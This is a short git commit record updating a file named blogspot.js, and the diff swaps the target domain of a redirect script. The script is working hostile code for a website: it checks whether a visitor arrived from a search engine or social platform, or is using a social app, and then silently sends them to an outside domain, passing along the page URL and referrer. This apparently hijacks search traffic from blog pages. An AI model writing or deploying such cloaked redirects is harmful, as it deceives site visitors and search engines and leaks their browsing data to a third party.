924c64d45ed5e3687c2406b0f9f1762542dcdfd0
Aini Sastra <aini.sastra@gmail.com>
2022-09-07 08:10:20 +0800

    Update blogspot.js

--- blogspot.js
+++ blogspot.js
@@ -1,3 +1,3 @@
-var ars = 'https://www.wiringview.co';
+var ars = 'https://www.176iot.com';
 
 if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', 'aol.', 'msn.', 'baidu.', 'slurp.', 'sogou.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
